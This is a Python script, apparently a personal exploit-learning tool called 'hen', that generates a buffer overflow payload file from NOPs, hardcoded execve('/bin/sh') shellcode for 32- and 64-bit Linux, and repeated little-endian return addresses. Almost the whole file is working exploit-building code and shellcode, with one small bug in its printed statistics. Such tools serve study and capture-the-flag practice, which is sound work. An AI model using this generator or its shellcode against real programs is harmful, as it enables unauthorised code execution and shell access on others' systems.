#!/bin/python3

###############################################################################
# hen lays an egg.
# Given input parameters on how to craft it, creates a buffer overflow egg and
# stores it in the file ./egg
###############################################################################

###################
# === imports === #
###################
import argparse

#####################
# === functions === #
#####################

# little_endian_ify -> take a 4-byte address and return its little-endian version. I *think* it should work for non-4-byte-addresses if architecture is set to the proper number of bits, but I haven't fully tested that so try it first if you need that funcitonality
def little_endian_ify(addr):
    bytes = []
    for i in range(architecture // 8):
        bytes.append((addr & (0xFF << 8 * i)) >> 8 * i) # yeah its a little wacky
        # uh, basically, shift by 8 and use and mask to get a byte, then shift back over by 8.
        # ^ thats the first byte, then shift by 16, 24, 32, etc
    return bytes

def init_args():
    parser = argparse.ArgumentParser(prog="hen", description="hens lay eggs")
    parser.add_argument("-b", "--buf", help="len in bytes of buffer (ie NOPs + shellcode)")
    parser.add_argument("-r", "--ret", help="number of return addresses to write")
    parser.add_argument("-a", "--addr", help="value of return addresses")
    parser.add_argument("-e", "--egg-order", help="default \"NSR\" (nop + shellcode + ret addrs). Sets ordering of egg elements in final egg. Additional option: A, fills in with \"A\"s, how many determined by -A option")
    parser.add_argument("-A", "--A-fill-size", help="if \"A\" option used in --egg-order option, this many A's will be filled in there")
    parser.add_argument("-q", "--quiet", help="don't print verbose info", action="store_true")
    args = parser.parse_args()
    return args

###################
# === GLOBALS === #
###################

# setings / defaults
# ##################
# settings may be overwritten by arguments

# machine code
SHELLCODE_32 = b"\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
SHELLCODE_64 = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
SHELLCODE = SHELLCODE_32
NOP = b"\x90"

# offsets and shit
buffersize = 200 # NOPs+shellcode. ie num bytes until we start writing return
return_address = 0xc0000000
num_return_addresses = 8
A_fill_size = 0 # number of "A"s to fill in

architecture = 32 # 32bits

EGG_ORDER = "NSR" # NSR => Nops, then Shellcode, then Return addresses

# parse arguments
# ###############
args = init_args()
if args.buf:
    buffersize = int(args.buf)
if args.ret:
    num_return_addresses = int(args.ret)
if args.addr:
    return_address = int(args.addr)
if args.egg_order:
    EGG_ORDER = args.egg_order
if args.A_fill_size:
    A_fill_size = int(args.A_fill_size)

# calculated based on settings
# ############################
SHELLSIZE = len(SHELLCODE)
NOPsize = buffersize - SHELLSIZE

########################
# === make the egg === #
########################

# generate nops
egg_nops = []
while len(egg_nops) < NOPsize:
    for NOPbyte in NOP:
        egg_nops.append(NOPbyte)
size_nops = len(egg_nops)

# get shellcode
egg_shellcode = []
for byte in SHELLCODE:
    egg_shellcode.append(byte)
size_shellcode = len(egg_shellcode)

# add return addresses
egg_ret_addrs = []
for i in range(num_return_addresses):
    for byte in little_endian_ify(return_address):
        egg_ret_addrs.append(byte)
size_return = len(egg_ret_addrs)

# (optional) add "A" buffer
egg_A = []
for i in range(A_fill_size):
    egg_A.append(0x41) # 0x41 is "A"

# assemble chunks into final egg
egg = []
for egg_element in EGG_ORDER:
    if egg_element == "N":
        egg = egg + egg_nops
    if egg_element == "S":
        egg = egg + egg_shellcode
    if egg_element == "R":
        egg = egg + egg_ret_addrs
    if egg_element == "A":
        egg = egg + egg_A

if not args.quiet:
    print("Stats:")
    print("total egg len:", len(egg), "bytes")
    print("egg order:", EGG_ORDER)
    print("no-ops:     size =", size_nops, "bytes")
    print("shellcode:  size =", size_shellcode, "bytes")
    print("ret addrs:  size =", size_return, "bytes")
    print("A buf fill: size =", size_return, "bytes")

with open("egg", "wb") as f:
    f.write(bytearray(egg))

